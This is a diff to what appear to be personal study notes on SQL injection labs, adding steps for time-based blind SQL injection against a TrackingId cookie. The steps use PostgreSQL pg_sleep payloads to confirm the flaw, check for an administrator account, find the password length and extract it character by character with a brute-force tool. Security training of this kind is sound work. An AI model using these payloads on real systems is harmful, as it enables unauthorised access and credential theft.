@@ -216,7 +216,13 @@ Theory:-  Error-based SQL injection refers to cases where you're able to use err
 
     1.TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- (verify that there is time delay of 10s)
     2.TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--   (verify that there is no time delay)
-    3.TrackingId=x''%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- (verify that there is time delay means user administrator exists)
+    3.TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- (verify that there is time delay means user administrator exists)
     4.TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- (if time delay is 10s it means  that password length is greater than 20)
     5.TrackingId=x'+||+(SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users)-- (used to extract single char of password in same method as in previous lab)
-    6. And set maximum resource pool to 1 
+    6.Add payloads on first 1 and a and for first position keep payload as number and other as a-z and 0-9 and use cluster bomb attack
+    7.Sort responser received from descending order and as particular position enter the keyword and complete the password.
+
+
+--------------------------------------------------------------------------------------------------------------------------
+
+#13 Lab: 
